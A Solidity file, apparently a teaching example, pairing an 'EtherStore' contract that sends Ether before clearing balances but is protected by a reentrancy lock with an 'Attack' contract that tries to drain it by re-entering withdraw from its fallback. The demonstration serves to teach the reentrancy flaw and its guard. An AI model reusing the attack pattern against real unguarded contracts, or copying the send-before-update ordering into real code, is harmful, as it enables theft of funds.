// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract EtherStore {
    mapping(address => uint256) public balances;
    bool internal locked;
    modifier noReentrant() {
        require(!locked, "No re-entracncy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    ///not having enough funds;
    error insufficient_funds();

    ///failed to send ether
    error not_confirm();

    function withdraw() public noReentrant{
        uint256 bal = balances[msg.sender];

        if (bal <= 0) {
            revert insufficient_funds();
        }

        (bool sent, ) = msg.sender.call{value: bal}("");

        if (!sent) {
            revert not_confirm();
        }

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    receive() external payable{

    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
